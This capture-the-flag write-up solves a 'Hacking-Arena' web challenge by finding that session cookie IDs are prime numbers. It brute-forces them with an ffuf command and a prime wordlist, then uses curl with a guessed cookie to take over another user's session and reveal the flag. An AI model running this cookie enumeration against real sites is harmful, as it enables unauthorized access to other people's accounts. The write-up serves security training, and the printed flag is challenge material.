# Flag

> **Hacking-Arena{Prime_days_a_week}**

# Prompt

> **Find the user: [http://vader.hackingarena.com:825](http://vader.hackingarena.com:825/)**

# Solution

Since we are working on multiple user-logins and already have access to 3 of them. I decided to use burp and collect the 3 different cookie id's.

* John: beatlesid=11161
* Paul: beatlesid=15803
* George: beatlesid=10303

Immediately we can tell that the id's are prime numbers, which led me to brute force the cookie id's with 5000 prime numbers from 5000.

```
ffuf -u "http://vader.hackingarena.com:825/index.php" -b "beatlesid=FUZZ" -w "Desktop/primes" -fs 543
```

This allows us to check all beatlesid's with the prime numbers from a txt-file, filtering out those with a size of 543, leaving us with id's with actual web-content.

* 10303 (George)
* 11161 (John)
* 15803 (Paul)
* 17159, size 579

Lastly, we want to check the foreign prime number by using **Curl**

```
curl -b "beatlesid=17159" "http://vader.hackingarena.com:825/index.php"
```

![[Pasted image 20241024165046.png]]

We have now found a flag.
# Additional Info

Additional solution / info